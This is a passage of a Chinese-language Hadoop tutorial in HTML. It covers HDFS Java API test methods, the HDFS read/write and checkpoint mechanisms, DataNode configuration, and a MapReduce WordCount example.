class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//HDFS文件下载</span></span><br><span class="line"><span class="comment">//注意：如果执行上面代码，下载不了文件，有可能是你电脑的微软支持的运行库少，需要安装一下微软运行库</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testCopyToLocalFile</span><span class="params">()</span> <span class="keyword">throws</span> IOException, InterruptedException, URISyntaxException</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1 获取文件系统</span></span><br><span class="line">    Configuration configuration = <span class="keyword">new</span> Configuration();</span><br><span class="line">    FileSystem fs = FileSystem.get(<span class="keyword">new</span> URI(<span class="string">"hdfs://hadoop102:8020"</span>), configuration, <span class="string">"atguigu"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2 执行下载操作</span></span><br><span class="line">    <span class="comment">// boolean delSrc 指是否将原文件删除</span></span><br><span class="line">    <span class="comment">// Path src 指要下载的文件路径</span></span><br><span class="line">    <span class="comment">// Path dst 指将文件下载到的路径</span></span><br><span class="line">    <span class="comment">// boolean useRawLocalFileSystem 是否开启文件校验</span></span><br><span class="line">    fs.copyToLocalFile(<span class="keyword">false</span>, <span class="keyword">new</span> Path(<span class="string">"/xiyou/huaguoshan/sunwukong.txt"</span>), <span class="keyword">new</span> Path(<span class="string">"d:/sunwukong2.txt"</span>), <span class="keyword">true</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3 关闭资源</span></span><br><span class="line">    fs.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//HDFS文件更名和移动</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testRename</span><span class="params">()</span> <span class="keyword">throws</span> IOException, InterruptedException, URISyntaxException</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 1 获取文件系统</span></span><br><span class="line">  Configuration configuration = <span class="keyword">new</span> Configuration();</span><br><span class="line">  FileSystem fs = FileSystem.get(<span class="keyword">new</span> URI(<span class="string">"hdfs://hadoop102:8020"</span>), configuration, <span class="string">"atguigu"</span>); </span><br><span class="line">  <span class="comment">// 文件夹也是同理更名</span></span><br><span class="line">  <span class="comment">// 2 修改文件名称</span></span><br><span class="line">  fs.rename(<span class="keyword">new</span> Path(<span class="string">"/xiyou/huaguoshan/sunwukong.txt"</span>), <span class="keyword">new</span> Path(<span class="string">"/xiyou/huaguoshan/meihouwang.txt"</span>));</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// 3 关闭资源</span></span><br><span class="line">  fs.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//HDFS删除文件和目录</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testDelete</span><span class="params">()</span> <span class="keyword">throws</span> IOException, InterruptedException, URISyntaxException</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 1 获取文件系统</span></span><br><span class="line">  Configuration configuration = <span class="keyword">new</span> Configuration();</span><br><span class="line">  FileSystem fs = FileSystem.get(<span class="keyword">new</span> URI(<span class="string">"hdfs://hadoop102:8020"</span>), configuration, <span class="string">"atguigu"</span>);</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// 2 执行删除</span></span><br><span class="line">  fs.delete(<span class="keyword">new</span> Path(<span class="string">"/xiyou"</span>), <span class="keyword">true</span>);</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// 3 关闭资源</span></span><br><span class="line">  fs.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//HDFS文件详情查看</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testListFiles</span><span class="params">()</span> <span class="keyword">throws</span> IOException, InterruptedException, URISyntaxException </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 1获取文件系统</span></span><br><span class="line">  Configuration configuration = <span class="keyword">new</span> Configuration();</span><br><span class="line">  FileSystem fs = FileSystem.get(<span class="keyword">new</span> URI(<span class="string">"hdfs://hadoop102:8020"</span>), configuration, <span class="string">"atguigu"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 2 获取文件详情</span></span><br><span class="line">  RemoteIterator&lt;LocatedFileStatus&gt; listFiles = fs.listFiles(<span class="keyword">new</span> Path(<span class="string">"/"</span>),<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (listFiles.hasNext()) &#123;</span><br><span class="line">    LocatedFileStatus fileStatus = listFiles.next();</span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">"========"</span> + fileStatus.getPath() + <span class="string">"========="</span>);</span><br><span class="line">    System.out.println(fileStatus.getPermission());</span><br><span class="line">    System.out.println(fileStatus.getOwner());</span><br><span class="line">    System.out.println(fileStatus.getGroup());</span><br><span class="line">    System.out.println(fileStatus.getLen());</span><br><span class="line">    System.out.println(fileStatus.getModificationTime());</span><br><span class="line">    System.out.println(fileStatus.getReplication());</span><br><span class="line">    System.out.println(fileStatus.getBlockSize());</span><br><span class="line">    System.out.println(fileStatus.getPath().getName());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取块信息</span></span><br><span class="line">    BlockLocation[] blockLocations = fileStatus.getBlockLocations();</span><br><span class="line">    System.out.println(Arrays.toString(blockLocations));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 3 关闭资源</span></span><br><span class="line">  fs.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//HDFS文件和文件夹判断</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testListStatus</span><span class="params">()</span> <span class="keyword">throws</span> IOException, InterruptedException, URISyntaxException</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1 获取文件配置信息</span></span><br><span class="line">    Configuration configuration = <span class="keyword">new</span> Configuration();</span><br><span class="line">    FileSystem fs = FileSystem.get(<span class="keyword">new</span> URI(<span class="string">"hdfs://hadoop102:8020"</span>), configuration, <span class="string">"atguigu"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2 判断是文件还是文件夹</span></span><br><span class="line">    FileStatus[] listStatus = fs.listStatus(<span class="keyword">new</span> Path(<span class="string">"/"</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (FileStatus fileStatus : listStatus) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果是文件</span></span><br><span class="line">        <span class="keyword">if</span> (fileStatus.isFile()) &#123;</span><br><span class="line">            System.out.println(<span class="string">"f:"</span>+fileStatus.getPath().getName());</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"d:"</span>+fileStatus.getPath().getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3 关闭资源</span></span><br><span class="line">    fs.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4、HDFS的读写流程-面试重点">4、HDFS的读写流程(面试重点)</h2><h3 id="4-1-HDFS-写数据流程">4.1 HDFS 写数据流程</h3><ul><li>客户端通过Distributed FileSystem模块向NameNode请求上传文件，NameNode检查目标文件是否已存在，父目录是否存在</li><li>NameNode返回是否可以上传</li><li>客户端请求第一个 Block上传到哪几个DataNode服务器上</li><li>NameNode返回3个DataNode节点，分别为dn1、dn2、dn3</li><li>客户端通过FSDataOutputStream模块请求dn1上传数据，dn1收到请求会继续调用dn2，然后dn2调用dn3，将这个通信管道建立完成</li><li>dn1、dn2、dn3逐级应答客户端</li><li>客户端开始往dn1上传第一个Block（先从磁盘读取数据放到一个本地内存缓存），以Packet为单位，dn1收到一个Packet就会传给dn2，dn2传给dn3；dn1每传一个packet会放入一个应答队列等待应答</li><li>当一个Block传输完成之后，客户端再次请求NameNode上传第二个Block的服务器。（重复执行3-7步）</li></ul><p><img src="http://qnypic.shawncoding.top/blog/202401251330905.png" alt></p><p>对于<strong>网络拓扑-节点距离计算</strong>，在HDFS写数据的过程中，NameNode会选择距离待上传数据最近距离的DataNode接收数据，<strong>节点距离：两个节点到达最近的共同祖先的距离总和。</strong></p><p>对于<strong>机架感知（副本存储节点选择）</strong>，可以查看<a href="http://hadoop.apache.org/docs/r3.1.3/hadoop-project-dist/hadoop-hdfs/HdfsDesign.html#Data_Replication" target="_blank" rel="noopener" title="官方手册">官方手册</a>，<code>Crtl + n </code>查找<code>BlockPlacementPolicyDefault</code>，在该类中查找<code>chooseTargetInOrder</code>方法</p><p><img src="http://qnypic.shawncoding.top/blog/202401251330906.png" alt></p><h3 id="4-2-HDFS-读数据流程">4.2 HDFS 读数据流程</h3><ul><li>客户端通过 DistributedFileSystem 向 NameNode 请求下载文件，NameNode 通过查询元数据，找到文件块所在的 DataNode 地址</li><li>挑选一台 DataNode（就近原则，然后随机）服务器，请求读取数据</li><li>DataNode 开始传输数据给客户端（从磁盘里面读取数据输入流，以 Packet 为单位来做校验）</li><li>客户端以 Packet 为单位接收，先在本地缓存，然后写入目标文件</li></ul><p><img src="http://qnypic.shawncoding.top/blog/202401251330907.png" alt></p><h2 id="5、NameNode-和-SecondaryNameNode">5、NameNode 和 SecondaryNameNode</h2><h3 id="5-1-NN和2NN工作机制">5.1 NN和2NN工作机制</h3><p>NameNode 中的元数据是存储在哪里的？如果只存在内存中，一旦断电，元数据丢失，整个集群就无法工作了。因此<strong>产生在磁盘中备份元数据的FsImage</strong>。为了防止NameNode 节点断电，就会产生数据丢失。<strong>引入 Edits 文件（只进行追加操作，效率很高）。每当元数据有更新或者添加元数据时，修改内存中的元数据并追加到 Edits 中</strong>。这样，一旦 NameNode 节点断电，可以<strong>通过 FsImage 和 Edits 的合并，合成元数据</strong>。而新的节点SecondaryNamenode，专门用于FsImage和Edits的合并</p><p><img src="http://qnypic.shawncoding.top/blog/202401251330908.png" alt></p><h3 id="5-2-Fsimage和Edits解析">5.2 Fsimage和Edits解析</h3><p><img src="http://qnypic.shawncoding.top/blog/202401251330909.png" alt></p><p>另外会生成两个fsimage，其中另一个是在 Secondary NameNode 上生成的 Checkpoint 文件，它记录了上一次合并的文件系统状态信息。查看Fsimages文件和Edits文件如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># =====================oiv查看Fsimage文件=================</span></span><br><span class="line"><span class="comment"># 基本语法</span></span><br><span class="line">hdfs oiv -p 文件类型 -i镜像文件 -o 转换后文件输出路径</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将显示的xml文件内容拷贝到Idea中创建的xml文件中，并格式化</span></span><br><span class="line"><span class="built_in">cd</span> /opt/module/hadoop-3.1.3/data/dfs/name/current</span><br><span class="line">hdfs oiv -p XML -i fsimage_0000000000000000025 -o /opt/module/hadoop-3.1.3/fsimage.xml</span><br><span class="line">cat /opt/module/hadoop-3.1.3/fsimage.xml</span><br><span class="line"><span class="comment"># 可以看出，Fsimage中没有记录块所对应DataNode,因为在集群启动后，要求DataNode上报数据块信息，并间隔一段时间后再次上报</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ======================oev查看Edits文件=================</span></span><br><span class="line"><span class="comment"># 基本语法</span></span><br><span class="line">hdfs oev -p 文件类型 -i编辑日志 -o 转换后文件输出路径</span><br><span class="line">hdfs oev -p XML -i edits_0000000000000000012-0000000000000000013 -o /opt/module/hadoop-3.1.3/edits.xml</span><br><span class="line">cat /opt/module/hadoop-3.1.3/edits.xml</span><br><span class="line"><span class="comment"># NameNode如何确定下次开机启动的时候合并哪些Edits？是根据fsimages号大于的进行合并</span></span><br></pre></td></tr></table></figure><h3 id="5-3-CheckPoint时间设置">5.3 CheckPoint时间设置</h3><ul><li>通常情况下，SecondaryNameNode每隔一小时执行一次，配置文件在<code>[hdfs-default.xml]</code></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.checkpoint.period<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>3600s<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>一分钟检查一次操作次数，当操作次数达到1百万时，SecondaryNameNode执行一次</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.checkpoint.txns<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>1000000<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span>操作动作次数<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.checkpoint.check.period<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>60s<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span> 1分钟检查一次操作次数<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="6、DataNode">6、DataNode</h2><h3 id="6-1-DataNode工作机制">6.1 DataNode工作机制</h3><ul><li>一个数据块在DataNode上以文件形式存储在磁盘上，包括两个文件，一个是数据本身，一个是元数据包括数据块的长度，块数据的校验和，以及时间戳</li><li>DataNode启动后向NameNode注册，通过后，周期性（6小时）的向NameNode上报所有的块信息。</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--DN向NN汇报当前解读信息的时间间隔，默认6小时--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.blockreport.intervalMsec<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>21600000<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Determines block reporting interval in milliseconds.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--DN扫描自己节点块信息列表的时间，默认6小时--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.datanode.directoryscan.interval<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>21600s<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Interval in seconds for Datanode to scan data directories and reconcile the difference between blocks in memory and on the disk.</span><br><span class="line">  Support multiple time unit suffix(case insensitive), as described</span><br><span class="line">  in dfs.heartbeat.interval.</span><br><span class="line">  <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>心跳是每3秒一次，心跳返回结果带有NameNode给该DataNode的命令如复制块数据到另一台机器，或删除某个数据块。如果超过10分钟没有收到某个DataNode的心跳，则认为该节点不可用</li><li>集群运行中可以安全加入和退出一些机器</li></ul><p><img src="http://qnypic.shawncoding.top/blog/202401251330910.png" alt></p><h3 id="6-2-数据完整性">6.2 数据完整性</h3><ul><li>当DataNode读取Block的时候，它会计算CheckSum</li><li>如果计算后的CheckSum，与Block创建时值不一样，说明Block已经损坏</li><li>Client读取其他DataNode上的Block</li><li>常见的校验算法crc（32），md5（128），sha1（160）</li><li>DataNode在其文件创建后周期验证CheckSum</li></ul><h3 id="6-3-掉线时限参数设置">6.3 掉线时限参数设置</h3><p><img src="http://qnypic.shawncoding.top/blog/202401251330911.png" alt></p><p>需要注意的是hdfs-site.xml 配置文件中的heartbeat.recheck.interval的单位为毫秒，dfs.heartbeat.interval的单位为秒</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.heartbeat.recheck-interval<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>300000<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.heartbeat.interval<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><h1>三、MapReduce</h1><h2 id="1、MapReduce概述">1、MapReduce概述</h2><h3 id="1-1-MapReduce定义">1.1 MapReduce定义</h3><p>MapReduce是一个<strong>分布式运算程序</strong>的编程框架，是用户开发&quot;基于Hadoop的数据分析应用&quot;的核心框架。MapReduce核心功能是将用户编写的业务逻辑代码和自带默认组件整合成一个完整的分布式运算程序，并发运行在一个Hadoop集群上。</p><h3 id="1-2-优缺点">1.2 优缺点</h3><p><strong>优点</strong></p><ul><li>易于编程。用户只需要关心业务逻辑</li><li>良好的扩展性。可以动态增加服务器，解决计算资源不够的问题</li><li>高容错性。任何一台集群挂掉，可以将任务转移到其他节点</li><li>适合海量数据计算（TB/PB）。几千台服务器共同计算</li></ul><p><strong>缺点</strong></p><ul><li>不擅长实时计算。MySQL擅长</li><li>不擅长流式计算。Flink擅长</li><li>不擅长DAG有向无关图计算。Spark擅长</li></ul><h3 id="1-3-MapReduce核心思想">1.3 MapReduce核心思想</h3><p>一个完整的MapReduce程序在分布式运行时有三类实例进程：</p><ul><li><strong>MrAppMaster</strong>：负责整个程序的过程调度及状态协调</li><li><strong>MapTask</strong>：负责Map阶段的整个数据处理流程</li><li><strong>ReduceTask</strong>：负责Reduce阶段的整个数据处理流程</li></ul><p><img src="http://qnypic.shawncoding.top/blog/202401251330912.png" alt></p><h3 id="1-4-序列化类型与编程规范">1.4 序列化类型与编程规范</h3><table><thead><tr><th><strong>Java类型</strong></th><th><strong>Hadoop Writable类型</strong></th></tr></thead><tbody><tr><td>Boolean</td><td>BooleanWritable</td></tr><tr><td>Byte</td><td>ByteWritable</td></tr><tr><td>Int</td><td>IntWritable</td></tr><tr><td>Float</td><td>FloatWritable</td></tr><tr><td>Long</td><td>LongWritable</td></tr><tr><td>Double</td><td>DoubleWritable</td></tr><tr><td><strong>String</strong></td><td><strong>Text</strong></td></tr><tr><td>Map</td><td>MapWritable</td></tr><tr><td>Array</td><td>ArrayWritable</td></tr><tr><td>Null</td><td>NullWritable</td></tr></tbody></table><p>用户编写的程序分为3个部分：Mapper、Reducer和Driver</p><p><strong>Mapper阶段</strong></p><ul><li>用户自定义的Mapper要继承自己的父类</li><li>Mapper的输入是键值对的形式</li><li>Mapper中的业务逻辑写在map()方法中</li><li>Mapper的输出是键值对的形式</li><li>map()方法对每一个&lt;K, V&gt;调用一次</li></ul><p><strong>Reducer阶段</strong></p><ul><li>用户自定义的Reducer要继承自己的父类</li><li>Reducer的输入类型与Mapper的输入类型相对应</li><li>Reducer的业务逻辑写在reduce()方法中</li><li>ReduceTask进程对每一组相同的&lt;K, V&gt;调用一次reduce()方法</li></ul><p><strong>Driver阶段</strong></p><ul><li>相当于Yarn集群的客户端，用于提交整个程序到Yarn集群，提交的是封装</li><li>MapReduce程序相关运行 参数的job对象</li></ul><h3 id="1-5-WordCount案例实操">1.5 WordCount案例实操</h3><p><img src="http://qnypic.shawncoding.top/blog/202401251330913.png" alt></p><p>通过IDEA创建工程，环境和上面API操作一致，创建包名com.atguigu.mapreduce.wordcount</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注意导入包都要选择mapreduce.xxx的，mapred是之前1.x的写法</span></span><br><span class="line"><span class="comment">//编写Mapper类</span></span><br><span class="line"><span class="comment">// 四元分别是输入的&lt;key,value&gt;和输出到reducer的&lt;key,value&gt;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WordCountMapper</span> <span class="keyword">extends</span> <span class="title">Mapper</span>&lt;<span class="title">LongWritable</span>, <span class="title">Text</span>, <span class="title">Text</span>, <span class="title">IntWritable</span>&gt; </span>&#123;</span><br><span class="line">    Text k = <span class="keyword">new</span> Text();</span><br><span class="line">    IntWritable v = <span class="keyword">new</span> IntWritable(<span class="number">1</span>);</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">map</span><span class="params">(LongWritable key, Text value, Context context)</span>  <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">        <span class="comment">// 1 获取一行</span></span><br><span class="line">        String line = value.toString();</span><br><span class="line">        <span class="comment">// 2 切割</span></span><br><span class="line">        String[] words = line.split(<span class="string">" "</span>);</span><br><span class="line">        <span class="comment">// 3 输出</span></span><br><span class="line">        <span class="keyword">for</span> (String word : words) &#123;</span><br><span class="line">            k.set(word);</span><br><span class="line">            context.write(k, v);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//编写Reducer类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WordCountReducer</span> <span class="keyword">extends</span> <span class="title">Reducer</span>&lt;<span class="title">Text</span>, <span class="title">IntWritable</span>, <span class="title">Text</span>, <span class="title">IntWritable</span>&gt;</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> sum;</span><br><span class="line">IntWritable v = <span class="keyword">new</span> IntWritable();</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">reduce</span><span class="params">(Text key, Iterable&lt;IntWritable&gt; values,Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">    <span class="comment">// 1 累加求和</span></span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 这相当于一个相同key集合</span></span><br><span class="line">    <span class="keyword">for</span> (IntWritable count : values) &#123;</span><br><span class="line">      sum += count.get();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2 输出</span></span><br><span class="line">         v.set(sum);</span><br><span class="line">    context.write(key,v);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//编写Driver驱动类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WordCountDriver</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InterruptedException </span>&#123;</span><br><span class="line">    <span class="comment">// 1 获取配置信息以及获取job对象</span></span><br><span class="line">    Configuration conf = <span class="keyword">new</span> Configuration();</span><br><span class="line">    Job job = Job.getInstance(conf);</span><br><span class="line">    <span class="comment">// 2 关联本Driver程序的jar</span></span><br><span class="line">    job.setJarByClass(WordCountDriver<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="comment">// 3 关联Mapper和Reducer的jar</span></span><br><span class="line">    job.setMapperClass(WordCountMapper<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    job.setReducerClass(WordCountReducer<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="comment">// 4 设置Mapper输出的kv类型</span></span><br><span class="line">    job.setMapOutputKeyClass(Text<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    job.setMapOutputValueClass(IntWritable<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="comment">// 5 设置最终输出kv类型</span></span><br><span class="line">    job.setOutputKeyClass(Text<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    job.setOutputValueClass(IntWritable<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    <span class="comment">// 6 设置输入和输出路径,可以暂时写自己的路径进行测试</span></span><br><span class="line">    FileInputFormat.setInputPaths(job, <span class="keyword">new</span> Path(args[<span class="number">0</span>]));</span><br><span class="line">    FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> Path(args[<span class="number">1</span>]));</span><br><span class="line">    <span class="comment">// 7 提交job</span></span><br><span class="line">    <span class="keyword">boolean</span> result = job.waitForCompletion(<span class="keyword">true</span>);</span><br><span class="line">    System.exit(result ? <span class="number">0</span> : <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>集群上测试，用maven打jar包，需要添加的打包插件依赖，然后package</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 